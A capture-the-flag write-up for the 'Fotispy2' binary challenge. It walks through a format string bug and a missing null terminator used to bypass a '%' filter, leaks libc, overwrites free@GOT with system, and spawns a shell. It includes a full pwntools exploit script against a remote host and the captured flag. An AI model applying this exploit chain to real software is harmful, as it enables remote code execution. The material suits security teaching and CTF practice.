# Fotispy2
TL;DR: This was a x86-64 bit binary with a format string vulnerability in it. User input is copied prior to checking it, leading to bypassing checks later due to a faulty `read` function not adding a nullbyte to input. Overwriting `free@GOT` to `system` allows spawning a shell.

## Reverse Engineering
```c
void main(void)

{
  int option;
  long in_FS_OFFSET;
  undefined clean_stack [416886];
  undefined2 local_12;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  memset(clean_stack,0,0x65c70);
  local_12 = 0;
  puts("Hello and welcome to my new experimental Fotispy app!");
  puts("===========================");
  do {
    MENU();
    read(&local_12,2);
    option = atoi((char *)&local_12);
    switch(option) {
    case 0:
      register(clean_stack);
      break;
    case 1:
      login(clean_stack);
      break;
    case 2:
      add_favorite(clean_stack);
      break;
    case 3:
      display_favorite(clean_stack);
      break;
    case 4:
      puts("Bye bye");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

This challenge will nullify the buffer `clean_stack` which is passed to multiple operations. We'll call this area the `context`. This is used throughout the program with multiple operations:

```c
void MENU(void)

{
  puts("");
  puts("[0] Register");
  puts("[1] Log in");
  puts("[2] Add a song to your favorites");
  puts("[3] Display your favorites");
  puts("[4] Exit");
  printf("Please enter your choice [4]: ");
  return;
}
```

The register function will essentially read in a username of `0x20` bytes and a password of `0x40` bytes into chunks allocated from `calloc`. The `find_space` function is called to determine which space within the `context` is free to put a user object:

```c
bool register(long context)

{
  char cVar1;
  void *username;
  void *password;
  
  cVar1 = find_space(context);
  if (cVar1 != -1) {
    username = calloc(0x20,1);
    password = calloc(0x40,1);
    printf("[~] Please enter a username: ");
    read(username,0x20);
    printf("[~] Please enter a password: ");
    read(password,0x40);
    *(undefined *)(context + (long)cVar1 * 0xa2d8 + 0x10) = 1;
    *(void **)((long)cVar1 * 0xa2d8 + context) = username;
    *(void **)((long)cVar1 * 0xa2d8 + context + 8) = password;
  }
```

The context holds an array of `user` objects I'll call `users`. The `find_space` function will use offset `0x10` within a user object and check if it's `1`, determining that it's in use within the `users` array:

```c
int find_space(long context)

{
  int i;
  
  i = 0;
  while( true ) {
    if (9 < i) {
      return -1;
    }
    if (*(char *)(context + (long)i * 0xa2d8 + 0x10) != '\x01') break;
    i = i + 1;
  }
  return i;
}
```

So at this point we knew this much about the user struct:

```c
struct User {
  char* username;
  char* password;
  char  in_use;
};
```

The login function will read in a username and password and check it against the users within the `users` array, setting `logged_in` to the index within the user array that it was found. 

```c
void add_favorite(long context)

{
  undefined4 title;
  undefined4 author;
  undefined4 album;
  char *__s;
  char *found;
  byte count;
  
  if (logged_in == 0xff) {
    puts("[-] No user has logged in yet.");
  }
  else {
    __s = (char *)calloc(0xa2c,1);
    printf("[~] Please enter a song title: ");
    title = read(__s,0x500);
    printf("[~] Please enter a who %s is from: ",__s);
    author = read(__s + 0x504,0x500);
    printf("[~] Please enter which album %s is on: ",__s + 0xa0c);
    album = read(__s + 0xa0c,0x20);
    *(undefined4 *)(__s + 0xa08) = album;
    *(undefined4 *)(__s + 0x500) = title;
    *(undefined4 *)(__s + 0xa04) = author;
    count = *(byte *)(context + (ulong)logged_in * 0xa2d8 + 0x11);
    if (count < 0x10) {
      memcpy((void *)((long)(int)(uint)count * 0xa2c + (ulong)logged_in * 0xa2d8 + context + 0x14),
             __s,0xa2c);
      found = strchr(__s,0x25);
      if (((found == (char *)0x0) && (found = strchr(__s + 0x504,0x25), found == (char *)0x0)) &&
         (found = strchr(__s + 0xa0c,0x25), found == (char *)0x0)) {
        context = context + (ulong)logged_in * 0xa2d8;
        *(char *)(context + 0x11) = *(char *)(context + 0x11) + '\x01';
        return;
      }
      puts("[-] Found an illegal character :(");
      free(__s);
    }
    else {
      free(__s);
      puts("[-] Favorites are full :(");
    }
  }
  return;
}
```

This function will operate on the currently logged in user. It will read three values `title`, `author`, and `album` from stdin. These are used to construct a `song` object. There is a value within the user struct `count` that's used to determine the amount of songs that belong to that user, ensuring it doesn't exceed 16. The function will check if your input contains `%` which seems like an odd check at first. If it doesn't the `count` is incremeneted by 1. Interestingly, the `song` struct is copied to within the user struct with `memcpy` prior to the checks passing. Below is the `song` struct and the updated user struct:

```c
struct Song {
    char title[0x500];          // Offset: 0x0
    char _padding1[0x4];        // Offset: 0x500
    char author[0x500];         // Offset: 0x504
    char _padding2[0x8];        // Offset: 0xa04
    char album[0x20];           // Offset: 0xa0c
};

// Size: 0xa2d8 (41688) bytes
struct User {
    char* username;            
    char* password;             
    char _padding1[0x2];
    char in_use;
    unsigned char song_count;
    char _padding2[0x2];
    struct Song favorites[16];
    char _padding3[0x4];
};
```

Now that we had the structures mapped out, we began looking into the `display_favorite` function:

```c
void display_favorite(long context)

{
  long lVar1;
  int x;
  
  if (logged_in == 0xff) {
    puts("[-] No user has logged in yet.");
  }
  else {
    puts("[~] Your favorites:");
    for (x = 0; x < (int)(uint)*(byte *)(context + (ulong)logged_in * 0xa2d8 + 0x11); x = x + 1) {
      lVar1 = (long)x * 0xa2c + (ulong)logged_in * 0xa2d8 + context;
      printf("    - ");
      printf((char *)(lVar1 + 0x14));
      printf(" - ");
      printf((char *)(lVar1 + 0xa20));
      printf(" - ");
      printf((char *)(lVar1 + 0x518));
      puts("\n");
    }
  }
  return;
}
```

This function has a clear `printf` format string vulnerability on all of the input fields. The blacklist on the character `%` makes sense now. It will increment up to `count` songs from the `songs` array. Unfortunately there seems to be no way to corrupt the `count` value to allow the `song` struct copied prior to checks to be used, so we began looking deeper into the `read` function used:

```c
int read(long context,long param_2)

{
  int iVar1;
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (param_2 <= local_c) {
      return local_c;
    }
    iVar1 = getc(stdin);
    if ((char)iVar1 == '\n') break;
    *(char *)(local_c + context) = (char)iVar1;
    local_c = local_c + 1;
  }
  return local_c;
}
```

This function fails to add a nullbyte to the end of the string. A string that reaches the max length will not be null terminated. This can be leveraged with the bugs found before to bypass the blacklist, giving format string capabilities

## Bypassing The Blacklist
Now that we understood the capabilities and the memory structure, we began looking into how we could combine strings. The `album` is `0x20` bytes and is the last value within the `song` struct. There is no spacing between songs in the `song` array, so if an `album` of `0x20` characters is supplied and a format string is attempted but fails, the memory from the format string will be copied to the songs struct still and the `album` field from the previous "real" song will print the `title` of the "corrupt" song:

```
[0] Register
[1] Log in
[2] Add a song to your favorites
[3] Display your favorites
[4] Exit
Please enter your choice [4]: 0
[~] Please enter a username: a
[~] Please enter a password: a

[0] Register
[1] Log in
[2] Add a song to your favorites
[3] Display your favorites
[4] Exit
Please enter your choice [4]: 1
[~] Please enter a username: a
[~] Please enter a password: a
[+] a has been logged in

[0] Register
[1] Log in
[2] Add a song to your favorites
[3] Display your favorites
[4] Exit
Please enter your choice [4]: 2
[~] Please enter a song title: a
[~] Please enter a who a is from: a
[~] Please enter which album  is on: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

[0] Register
[1] Log in
[2] Add a song to your favorites
[3] Display your favorites
[4] Exit
Please enter your choice [4]: [~] Please enter a song title: %p.%p.%p.%p.%p.%p
[~] Please enter a who %p.%p.%p.%p.%p.%p is from: x
[~] Please enter which album  is on: x
[-] Found an illegal character :(

[0] Register
[1] Log in
[2] Add a song to your favorites
[3] Display your favorites
[4] Exit
Please enter your choice [4]: 3
[~] Your favorites:
    - a - aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x7ffc5efec630.(nil).0x7f4d16abb887.0x3.(nil).0x55eabded58f4 - a

[0] Register
[1] Log in
[2] Add a song to your favorites
[3] Display your favorites
[4] Exit
```

This primitive could be used infinitely, so we wrote functions to utilize them and automate the exploitation:

```python
# register
io.recvuntil(b"[0] Register")
io.sendline(b"0")
io.recvuntil(b"username:")
io.sendline(b"a")
io.recvuntil(b"password:")
io.sendline(b"a")

# login
io.recvuntil(b"[0] Register")
io.sendline(b"1")
io.recvuntil(b"username:")
io.sendline(b"a")
io.recvuntil(b"password:")
io.sendline(b"a")

def format(io, title, author, album):
    io.recvuntil(b"[0] Register")
    io.sendline(b"2")
    io.recvuntil(b"title:")
    io.sendline(title)
    io.recvuntil(b"from:")
    io.sendline(author)
    io.recvuntil(b"on:")
    io.sendline(album)
    io.recvuntil(b"[0] Register")
    io.sendline(b"3")
    io.recvuntil(b"- a - ")
    return io.recvuntil(b" -")[:-2]

# setup character blacklist bypass
io.recvuntil(b"[0] Register")
io.sendline(b"2")
io.recvuntil(b"title:")
io.sendline(b"a")
io.recvuntil(b"from:")
io.sendline(b"a")
io.recvuntil(b"on:")
io.send(b"a"*0x20)

format(io, b"%p", b"x", b"x")
```

## Getting a Shell
Now that we had infinite format strings with a large length, we began looking for a way to spawn a shell. First we began looking into ways to get leaks. There was leaks to the base address of the binary and `user` holding the `username` of the user we registered:

```python
l = format(io, b".%10$p.%11$p.%12$p", b"a", b"a").split(b".")

LEAK = int(str(l[2], "utf-8"), 16)
BASE = LEAK - 0x19e5

print("BASE:", hex(BASE))
```

Now we needed to obtain a libc leak. Because we had the ability to place more than just the format string on the stack, we opted to use the `author` section of the "corrupt" song to hold addresses, derefencing with the `%s` modifier to get leaks. The `author` section of the "corrupt" song was at offset `501`, so by placing the pointer to `printf@GOT` there and using `%501$s` we receive a leak of the libc address for `printf`, which can be used to calculate the base address of `libc` and the address for `system`:

```python
print("BASE:", hex(BASE))

addresses = b"aaaa"
addresses += p64(BASE + bin.got["printf"])

l = format(io, b".%501$s.", addresses, b"a").split(b".")
libc_base = u64(l[1] + b"\x00\x00") - libc.sym["printf"]
system = libc_base + libc.sym["system"]

print("LIBC BASE:", hex(libc_base))
print("SYSTEM", hex(system))
```

Now that we had leaks, we could find a function to overwrite in the `GOT` to `system` that would operate on a pointer to user controlled data. This lead us to the `free` function which is exclusively called by `add_favorite` when a value contains an illegal character or the favorites are full. We specifically chose this gadget because the more obvious gadgets we tried required the `\n` character in the format string payload to overwrite the value in the `GOT`, causing the `read` function to terminate early:

```python
writes = {BASE + bin.got["free"]: system}

payload = fmtstr_payload(340, writes, numbwritten=32, write_size="short")
if b"\n" in payload:
    print("BAD PAYLOAD")
    exit(0)

format(io, payload, b"a", b"a")
```

Now `free@GOT` points to `system`. Entering `/bin/sh` as the username and `%` for the other fields causes a call to `free`, spawning a shell:

```python
# spawn shell.
io.recvuntil(b"[0] Register")
io.sendline(b"2")
io.recvuntil(b"title:")
io.sendline(b"/bin/sh\x00")
io.recvuntil(b"from:")
io.sendline(b"%")
io.recvuntil(b"on:")
io.sendline(b"%")
io.interactive()
```

## Full Exploit

```python
from pwn import *
from dbg import *

binary_path = "./fotispy2"
context.log_level = "INFO"
context.binary = bin = ELF(binary_path)

ctx = pwnio(bin,
            use_remote=True,
            use_debugger=True,
            debugger="rz",
            remote_ip="52.59.124.14",
            remote_port=5192,
            libc=ELF("libc.so"),
            ld=ELF("ld.so"),
            terminal="alacritty")

libc = ctx.libc
io = ctx.connect()

try:
    if ctx.use_debugger and not ctx.use_remote:
        # rizin script
        rz_script = f"""
        """

        ctx.debug(rz_script)
except Exception as e:
    print(e)

# EXPLOIT
ctx.cmd("dc", timeout=1)

# register
io.recvuntil(b"[0] Register")
io.sendline(b"0")
io.recvuntil(b"username:")
io.sendline(b"a")
io.recvuntil(b"password:")
io.sendline(b"a")

# login
io.recvuntil(b"[0] Register")
io.sendline(b"1")
io.recvuntil(b"username:")
io.sendline(b"a")
io.recvuntil(b"password:")
io.sendline(b"a")

def format(io, title, author, album):
    io.recvuntil(b"[0] Register")
    io.sendline(b"2")
    io.recvuntil(b"title:")
    io.sendline(title)
    io.recvuntil(b"from:")
    io.sendline(author)
    io.recvuntil(b"on:")
    io.sendline(album)
    io.recvuntil(b"[0] Register")
    io.sendline(b"3")
    io.recvuntil(b"- a - ")
    return io.recvuntil(b" -")[:-2]

# setup character blacklist bypass
io.recvuntil(b"[0] Register")
io.sendline(b"2")
io.recvuntil(b"title:")
io.sendline(b"a")
io.recvuntil(b"from:")
io.sendline(b"a")
io.recvuntil(b"on:")
io.send(b"a"*0x20)

l = format(io, b".%10$p.%11$p.%12$p", b"a", b"a").split(b".")

print(l)

LEAK = int(str(l[2], "utf-8"), 16)
BASE = LEAK - 0x19e5

print("BASE:", hex(BASE))

addresses = b"aaaa"
addresses += p64(BASE + bin.got["printf"])

l = format(io, b".%501$s.", addresses, b"a").split(b".")
libc_base = u64(l[1] + b"\x00\x00") - libc.sym["printf"]
system = libc_base + libc.sym["system"]

print("LIBC BASE:", hex(libc_base))
print("SYSTEM", hex(system))

writes = {BASE + bin.got["free"]: system}

payload = fmtstr_payload(340, writes, numbwritten=32, write_size="short")
if b"\n" in payload:
    print("BAD PAYLOAD")
    exit(0)

format(io, payload, b"a", b"a")

# spawn shell.
io.recvuntil(b"[0] Register")
io.sendline(b"2")
io.recvuntil(b"title:")
io.sendline(b"/bin/sh\x00")
io.recvuntil(b"from:")
io.sendline(b"%")
io.recvuntil(b"on:")
io.sendline(b"%")
io.interactive()

# ENO{pr1ntF_1n_7h3_l1nuX_k3rn3l_1gn0r3s_%n}
```